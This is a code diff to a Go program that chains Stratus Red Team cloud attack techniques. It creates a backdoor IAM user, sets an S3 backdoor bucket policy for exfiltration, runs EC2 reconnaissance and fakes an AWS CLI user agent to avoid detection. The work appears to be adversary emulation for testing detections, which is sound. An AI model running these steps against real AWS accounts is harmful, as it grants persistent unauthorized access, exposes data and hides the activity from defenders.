@@ -17,7 +17,6 @@ import (
 	"github.com/aws/aws-sdk-go-v2/service/s3"
 	"github.com/aws/smithy-go/middleware"
 	smithyhttp "github.com/aws/smithy-go/transport/http"
-	"github.com/datadog/stratus-red-team/v2/pkg/stratus/useragent"
 	"github.com/google/uuid"
 )
 
@@ -55,7 +54,7 @@ func createAWSConfigWithBackdoorCredentials(accessKeyID, secretAccessKey string,
 				return out, metadata, fmt.Errorf("unknown transport type %T", input.Request)
 			}
 			// Use a realistic AWS CLI user agent to avoid detection
-			userAgent := fmt.Sprintf("aws-cli/2.13.25 Python/3.11.5 Linux/5.15.0-84-generic source/x86_64.ubuntu.22.04 prompt/off command/s3.sync")
+			userAgent := "aws-cli/2.13.25 Python/3.11.5 Linux/5.15.0-84-generic source/x86_64.ubuntu.22.04 prompt/off command/s3.sync"
 			request.Header.Set("User-Agent", userAgent)
 			return next.HandleBuild(ctx, input)
 		})
@@ -88,9 +87,6 @@ func createAWSConfigWithBackdoorCredentials(accessKeyID, secretAccessKey string,
 const SCENARIO_PREFIX = "security-audit"
 
 func main() {
-	// Set realistic user agent prefix for all stratus techniques to avoid detection
-	useragent.SetUserAgentPrefix("aws-cli")
-
 	log.Println("Starting IAM-to-S3 exfiltration scenario...")
 
 	// Stage 1: Create backdoor IAM user and capture credentials
@@ -194,12 +190,12 @@ func createBackdoorUser() (*BackdoorCredentials, error) {
 func setupS3Backdoor() (string, error) {
 	// First clean up any existing S3 technique state
 	log.Println("Cleaning up any existing S3 technique state...")
-	cmd := exec.Command("../bin/stratus", "cleanup", "aws.exfiltration.s3-backdoor-bucket-policy", "--force")
+	cmd := exec.Command("../bin/stratus", "cleanup", "aws.exfiltration.s3-backdoor-bucket-policy", "--force", "--prefix", SCENARIO_PREFIX)
 	cmd.Run() // Ignore errors
 
 	// Warm up S3 backdoor technique
 	log.Println("Warming up S3 backdoor technique...")
-	cmd = exec.Command("../bin/stratus", "warmup", "aws.exfiltration.s3-backdoor-bucket-policy")
+	cmd = exec.Command("../bin/stratus", "warmup", "aws.exfiltration.s3-backdoor-bucket-policy", "--prefix", SCENARIO_PREFIX)
 	warmupOutput, err := cmd.CombinedOutput()
 	if err != nil {
 		return "", fmt.Errorf("S3 warmup failed: %w, output: %s", err, string(warmupOutput))
@@ -209,7 +205,7 @@ func setupS3Backdoor() (string, error) {
 
 	// Execute S3 backdoor technique
 	log.Println("Detonating S3 backdoor...")
-	cmd = exec.Command("../bin/stratus", "detonate", "aws.exfiltration.s3-backdoor-bucket-policy")
+	cmd = exec.Command("../bin/stratus", "detonate", "aws.exfiltration.s3-backdoor-bucket-policy", "--prefix", SCENARIO_PREFIX)
 	detonateOutput, err := cmd.CombinedOutput()
 	if err != nil {
 		return "", fmt.Errorf("S3 detonation failed: %w, output: %s", err, string(detonateOutput))
@@ -398,12 +394,12 @@ func performEC2Reconnaissance(creds *BackdoorCredentials) error {
 
 func cleanupBackdoorUser() {
 	log.Println("Cleaning up IAM backdoor user...")
-	cmd := exec.Command("../bin/stratus", "cleanup", "aws.persistence.iam-backdoor-user")
+	cmd := exec.Command("../bin/stratus", "cleanup", "aws.persistence.iam-backdoor-user", "--prefix", SCENARIO_PREFIX)
 	cmd.Run()
 }
 
 func cleanupS3Backdoor() {
 	log.Println("Cleaning up S3 backdoor...")
-	cmd := exec.Command("../bin/stratus", "cleanup", "aws.exfiltration.s3-backdoor-bucket-policy")
+	cmd := exec.Command("../bin/stratus", "cleanup", "aws.exfiltration.s3-backdoor-bucket-policy", "--prefix", SCENARIO_PREFIX)
 	cmd.Run()
 }
